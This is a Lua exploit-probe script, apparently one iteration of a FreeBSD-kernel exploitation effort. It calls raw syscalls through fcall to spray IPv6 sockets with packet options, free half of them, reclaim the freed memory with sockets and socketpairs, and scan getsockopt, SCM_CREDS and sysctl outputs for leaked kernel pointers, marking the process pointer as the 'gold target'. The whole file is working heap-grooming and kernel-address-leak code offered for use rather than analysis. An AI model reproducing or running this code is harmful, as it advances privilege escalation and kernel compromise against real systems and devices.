-- CRASH_CLASS: MODERATE
-- PROBE 143t: IPv6 pktopts overlap v3 — all calls via fcall, no loader wrappers
--
-- Context: 143s failed because syscall.socketpair=nil on this connection.
-- Strategy: use fcall(syscall_address, N) for ALL syscalls to avoid loader gaps.
-- Goal: spray IPv6 pktopts, free some, reclaim with socketpairs, scan for kernel ptrs.

print("=== PROBE 143t: PKTOPTS OVERLAP v3 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hx(v)
    if v == nil then return "nil" end
    if type(v) == "table" and v.tonumber then
        local h, l = get_hi_lo(v)
        return string.format("0x%X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end

local sc = syscall.syscall_address
print("[*] sc_addr=" .. hex(sc))
print("[*] pid=" .. tostring(syscall.getpid()))

-- Syscall wrappers via fcall
local function sc_socket(dom, typ, proto)
    local fn = fcall(sc, 97)
    return to_num(fn(uint64(dom), uint64(typ), uint64(proto)))
end
local function sc_close(fd)
    local fn = fcall(sc, 6)
    return to_num(fn(uint64(fd)))
end
local function sc_setsockopt(fd, level, name, val_ptr, len)
    local fn = fcall(sc, 105)
    return to_num(fn(uint64(fd), uint64(level), uint64(name), uint64(val_ptr), uint64(len)))
end
local function sc_getsockopt(fd, level, name, buf_ptr, lenp_ptr)
    local fn = fcall(sc, 118)
    return to_num(fn(uint64(fd), uint64(level), uint64(name), uint64(buf_ptr), uint64(lenp_ptr)))
end
local function sc_socketpair(dom, typ, proto, fds_ptr)
    local fn = fcall(sc, 135)
    return to_num(fn(uint64(dom), uint64(typ), uint64(proto), uint64(fds_ptr)))
end
local function sc_sendmsg(fd, msg_ptr, flags)
    local fn = fcall(sc, 28)
    return to_num(fn(uint64(fd), uint64(msg_ptr), uint64(flags)))
end
local function sc_recvmsg(fd, msg_ptr, flags)
    local fn = fcall(sc, 27)
    return to_num(fn(uint64(fd), uint64(msg_ptr), uint64(flags)))
end
local function sc_write(fd, buf, len)
    local fn = fcall(sc, 4)
    return to_num(fn(uint64(fd), uint64(buf), uint64(len)))
end
local function sc_read(fd, buf, len)
    local fn = fcall(sc, 3)
    return to_num(fn(uint64(fd), uint64(buf), uint64(len)))
end

--------------------------------------------------------------------
-- [A] Verify socketpair via fcall
--------------------------------------------------------------------
print("")
print("--- [A] Socketpair ---")

local spfds = memory.alloc(16)
memory.write_dword(spfds, 0)
memory.write_dword(spfds + 4, 0)

local rv_sp = sc_socketpair(1, 1, 0, spfds)
print("[A] socketpair ret=" .. rv_sp)

local sp0 = to_num(memory.read_dword(spfds))
local sp1 = to_num(memory.read_dword(spfds + 4))
print("[A] fds: " .. sp0 .. ", " .. sp1)

-- Test I/O
if rv_sp == 0 and sp0 > 0 then
    local wbuf = memory.alloc(16)
    local rbuf = memory.alloc(16)
    memory.write_qword(wbuf, uint64("0xDEADBEEFCAFEBABE"))
    local wv = sc_write(sp0, wbuf, 8)
    local rv = sc_read(sp1, rbuf, 8)
    print("[A] write=" .. wv .. " read=" .. rv .. " data=" .. hx(memory.read_qword(rbuf)))
    sc_close(sp0)
    sc_close(sp1)
end

--------------------------------------------------------------------
-- [B] IPv6 pktopts spray
--------------------------------------------------------------------
print("")
print("--- [B] IPv6 spray ---")

local optval = memory.alloc(16)
local NUM = 80
local socks = {}

for i = 1, NUM do
    local fd = sc_socket(28, 2, 0)
    if fd >= 0 then
        memory.write_dword(optval, 1)
        local rv = sc_setsockopt(fd, 41, 19, optval, 4) -- IPV6_2292PKTINFO
        if rv == 0 then
            -- Also set 2292HOPLIMIT and 2292RTHDR
            sc_setsockopt(fd, 41, 20, optval, 4)
            sc_setsockopt(fd, 41, 24, optval, 4)
            table.insert(socks, fd)
        else
            sc_close(fd)
        end
    end
end
print("[B] Created " .. #socks .. " IPv6 socks with pktopts")

--------------------------------------------------------------------
-- [C] Baseline opt25 (IPV6_2292PKTOPTIONS) read
--------------------------------------------------------------------
print("")
print("--- [C] Baseline ---")

local optbuf = memory.alloc(0x400)
local optlenp = memory.alloc(8)

for idx = 1, math.min(3, #socks) do
    local fd = socks[idx]
    for off = 0, 0x3FC, 4 do memory.write_dword(optbuf + off, 0) end
    memory.write_qword(optlenp, uint64(0x400))

    local rv = sc_getsockopt(fd, 41, 25, optbuf, optlenp)
    local got = to_num(memory.read_qword(optlenp))
    print("[C] fd=" .. fd .. " opt25 ret=" .. rv .. " len=" .. got)

    if rv == 0 and got > 0 then
        for off = 0, math.min(got - 4, 60), 4 do
            local dw = to_num(memory.read_dword(optbuf + off))
            if dw ~= 0 then
                print("[C]   +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", dw))
            end
        end
        -- Kernel pointer scan
        for off = 0, math.min(got - 8, 0x3F8), 8 do
            local q = memory.read_qword(optbuf + off)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    print("[C] !!! KPTR +" .. string.format("%X", off) .. "=" .. hx(q))
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- [D] Close half the sockets to free their pktopts
--------------------------------------------------------------------
print("")
print("--- [D] Free half ---")

local kept = {}
local freed = 0
for i = 1, #socks do
    if i % 2 == 0 then
        sc_close(socks[i])
        freed = freed + 1
    else
        table.insert(kept, socks[i])
    end
end
print("[D] Freed " .. freed .. ", kept " .. #kept)

--------------------------------------------------------------------
-- [E] Spray new IPv6 sockets + socketpairs to reclaim
--------------------------------------------------------------------
print("")
print("--- [E] Reclaim spray ---")

local reclaim_v6 = {}
local reclaim_sp = {}

-- Spray IPv6 sockets (same allocator as freed pktopts)
for i = 1, 40 do
    local fd = sc_socket(28, 2, 0)
    if fd >= 0 then
        memory.write_dword(optval, 1)
        if sc_setsockopt(fd, 41, 19, optval, 4) == 0 then
            table.insert(reclaim_v6, fd)
        else
            sc_close(fd)
        end
    end
end

-- Also spray socketpairs
for i = 1, 30 do
    local pfds = memory.alloc(16)
    if sc_socketpair(1, 1, 0, pfds) == 0 then
        local a = to_num(memory.read_dword(pfds))
        local b = to_num(memory.read_dword(pfds + 4))
        table.insert(reclaim_sp, {a=a, b=b})
    end
end

print("[E] Reclaim: " .. #reclaim_v6 .. " v6 socks + " .. #reclaim_sp .. " socketpairs")

--------------------------------------------------------------------
-- [F] Read kept sockets' pktopts — look for contamination
--------------------------------------------------------------------
print("")
print("--- [F] Post-reclaim scan ---")

local kptr_total = 0

for idx, fd in ipairs(kept) do
    for off = 0, 0x3FC, 4 do memory.write_dword(optbuf + off, 0) end
    memory.write_qword(optlenp, uint64(0x400))

    local rv = sc_getsockopt(fd, 41, 25, optbuf, optlenp)
    local got = to_num(memory.read_qword(optlenp))

    if rv == 0 and got > 0 then
        for off = 0, math.min(got - 8, 0x3F8), 8 do
            local q = memory.read_qword(optbuf + off)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    kptr_total = kptr_total + 1
                    if kptr_total <= 20 then
                        print("[F] !!! KPTR fd=" .. fd .. " +" .. string.format("%X", off) .. "=" .. hx(q))
                    end
                end
            end
        end
        if idx <= 5 then
            print("[F] fd=" .. fd .. " opt25 len=" .. got)
        end
    end

    -- Also check individual options
    for _, optnum in ipairs({19, 20, 24}) do
        for off = 0, 0xFF, 4 do memory.write_dword(optbuf + off, 0) end
        memory.write_qword(optlenp, uint64(0x100))
        local rv2 = sc_getsockopt(fd, 41, optnum, optbuf, optlenp)
        if rv2 == 0 then
            local got2 = to_num(memory.read_qword(optlenp))
            for off = 0, math.min(got2 - 8, 0xF8), 8 do
                local q = memory.read_qword(optbuf + off)
                if q then
                    local h, l = get_hi_lo(q)
                    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                        kptr_total = kptr_total + 1
                        if kptr_total <= 20 then
                            print("[F] !!! KPTR fd=" .. fd .. " opt" .. optnum .. " +" .. string.format("%X", off) .. "=" .. hx(q))
                        end
                    end
                end
            end
        end
    end
end

print("[F] Total kernel pointers from kept socks: " .. kptr_total)

--------------------------------------------------------------------
-- [G] SCM_CREDS via sendmsg/recvmsg for kernel cred leak
--------------------------------------------------------------------
print("")
print("--- [G] SCM_CREDS ---")

local scm_p = memory.alloc(16)
if sc_socketpair(1, 1, 0, scm_p) == 0 then
    local s0 = to_num(memory.read_dword(scm_p))
    local s1 = to_num(memory.read_dword(scm_p + 4))
    print("[G] socketpair: " .. s0 .. ", " .. s1)

    -- Enable LOCAL_CREDS on receiver: SOL_LOCAL=0, LOCAL_CREDS=2
    memory.write_dword(optval, 1)
    local lc_rv = sc_setsockopt(s1, 0, 2, optval, 4)
    print("[G] LOCAL_CREDS ret=" .. lc_rv)

    -- sendmsg: minimal msg
    local msghdr = memory.alloc(0x80)
    local iov = memory.alloc(0x20)
    local data = memory.alloc(0x10)
    memory.write_dword(data, 0x41)

    memory.write_qword(iov, uint64(data))
    memory.write_qword(iov + 8, uint64(4))

    -- Clear msghdr
    for off = 0, 0x7C, 4 do memory.write_dword(msghdr + off, 0) end
    memory.write_qword(msghdr + 16, uint64(iov))  -- msg_iov
    memory.write_dword(msghdr + 24, 1)             -- msg_iovlen

    local sm_rv = sc_sendmsg(s0, msghdr, 0)
    print("[G] sendmsg=" .. sm_rv)

    -- recvmsg with large cmsg buffer
    local rcm = memory.alloc(0x200)
    local rdata = memory.alloc(0x100)
    local riov = memory.alloc(0x20)
    local rhdr = memory.alloc(0x80)

    for off = 0, 0x1FC, 4 do memory.write_dword(rcm + off, 0xEE) end

    memory.write_qword(riov, uint64(rdata))
    memory.write_qword(riov + 8, uint64(0x100))

    for off = 0, 0x7C, 4 do memory.write_dword(rhdr + off, 0) end
    memory.write_qword(rhdr + 16, uint64(riov))
    memory.write_dword(rhdr + 24, 1)
    memory.write_qword(rhdr + 32, uint64(rcm))
    memory.write_dword(rhdr + 40, 0x200)

    local rm_rv = sc_recvmsg(s1, rhdr, 0)
    print("[G] recvmsg=" .. rm_rv)

    if rm_rv >= 0 then
        local clen = to_num(memory.read_dword(rhdr + 40))
        print("[G] controllen=" .. clen)

        if clen >= 12 then
            local cmsg_len = to_num(memory.read_dword(rcm))
            local cmsg_level = to_num(memory.read_dword(rcm + 4))
            local cmsg_type = to_num(memory.read_dword(rcm + 8))
            print("[G] cmsg: len=" .. cmsg_len .. " level=" .. cmsg_level .. " type=" .. cmsg_type)

            -- Dump all cmsg data
            for off = 12, math.min(cmsg_len - 1, 0x80), 4 do
                local dw = to_num(memory.read_dword(rcm + off))
                if dw ~= 0 then
                    print("[G]   +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", dw))
                end
            end

            -- Kernel pointer scan in cmsg
            for off = 0, math.min(clen - 8, 0x1F8), 8 do
                local q = memory.read_qword(rcm + off)
                if q then
                    local h, l = get_hi_lo(q)
                    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                        print("[G] !!! KPTR cmsg +" .. string.format("%X", off) .. "=" .. hx(q))
                    end
                end
            end
        end
    end

    sc_close(s0)
    sc_close(s1)
end

--------------------------------------------------------------------
-- [H] Try sysctl kern.proc.kstack (our PID)
-- CTL_KERN=1, KERN_PROC=14, KERN_PROC_KSTACK=35+?
-- Actually FreeBSD has KERN_PROC_KSTACK at index 15
--------------------------------------------------------------------
print("")
print("--- [H] Kernel stack probe ---")

local mib = memory.alloc(24)
local outbuf = memory.alloc(0x1000)
local olp = memory.alloc(8)
local pid_num = to_num(syscall.getpid())

-- Try KERN_PROC_KSTACK = {1, 14, 15, pid}
memory.write_dword(mib, 1)
memory.write_dword(mib + 4, 14)
memory.write_dword(mib + 8, 15)  -- KERN_PROC_KSTACK
memory.write_dword(mib + 12, pid_num)
memory.write_qword(olp, uint64(0x1000))

local sysctl_fn = fcall(sc, 202)
local ok_ks, rv_ks = pcall(function()
    return sysctl_fn(uint64(mib), uint64(4), uint64(outbuf), uint64(olp), uint64(0), uint64(0))
end)
print("[H] kstack sysctl ret=" .. tostring(rv_ks))

if ok_ks and to_num(rv_ks) == 0 then
    local got = to_num(memory.read_qword(olp))
    print("[H] kstack size=" .. got)
    for off = 0, math.min(got - 8, 0xFF8), 8 do
        local q = memory.read_qword(outbuf + off)
        if q then
            local h, l = get_hi_lo(q)
            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                print("[H] !!! KPTR kstack +" .. string.format("%X", off) .. "=" .. hx(q))
            end
        end
    end
end

--------------------------------------------------------------------
-- [I] Try KERN_PROC with various sub-commands for info leak
-- Sub-commands: 0=ALL, 1=PID, 4=UID, 8=PGRP
--------------------------------------------------------------------
print("")
print("--- [I] kinfo_proc deep scan ---")

memory.write_dword(mib, 1)      -- CTL_KERN
memory.write_dword(mib + 4, 14) -- KERN_PROC
memory.write_dword(mib + 8, 1)  -- KERN_PROC_PID
memory.write_dword(mib + 12, pid_num)
memory.write_qword(olp, uint64(0x1000))

local ok_ki, rv_ki = pcall(function()
    return sysctl_fn(uint64(mib), uint64(4), uint64(outbuf), uint64(olp), uint64(0), uint64(0))
end)

if ok_ki and to_num(rv_ki) == 0 then
    local got = to_num(memory.read_qword(olp))
    print("[I] kinfo_proc size=" .. got)

    -- Full 8-byte scan for kernel pointers
    local ki_kptrs = 0
    for off = 0, math.min(got - 8, 0xFF8), 8 do
        local q = memory.read_qword(outbuf + off)
        if q then
            local h, l = get_hi_lo(q)
            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                ki_kptrs = ki_kptrs + 1
                print("[I] !!! KPTR kinfo +" .. string.format("%X", off) .. "=" .. hx(q))
            end
        end
    end
    print("[I] kinfo kernel pointers: " .. ki_kptrs)

    -- Dump interesting offsets
    -- ki_paddr at +304 (FreeBSD proc pointer — THE gold target)
    -- ki_addr at +312 (user area address)
    local interesting = {
        {0x00, "structsize"},
        {0x130, "ki_paddr"},   -- 304
        {0x138, "ki_addr"},    -- 312
        {0x148, "ki_tracep"},  -- 328
        {0x150, "ki_textvp"},  -- 336
        {0x158, "ki_fd"},      -- 344
        {0x160, "ki_vmspace"}, -- 352
    }
    for _, t in ipairs(interesting) do
        local q = memory.read_qword(outbuf + t[1])
        if q then
            local h, l = get_hi_lo(q)
            local marker = ""
            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then marker = " ***KERNEL***" end
            print("[I] " .. t[2] .. " +" .. string.format("%X", t[1]) .. "=" .. hx(q) .. marker)
        end
    end
end

--------------------------------------------------------------------
-- Cleanup
--------------------------------------------------------------------
print("")
for _, fd in ipairs(kept) do pcall(function() sc_close(fd) end) end
for _, fd in ipairs(reclaim_v6) do pcall(function() sc_close(fd) end) end
for _, p in ipairs(reclaim_sp) do
    pcall(function() sc_close(p.a) end)
    pcall(function() sc_close(p.b) end)
end

print("=== PROBE 143t COMPLETE ===")
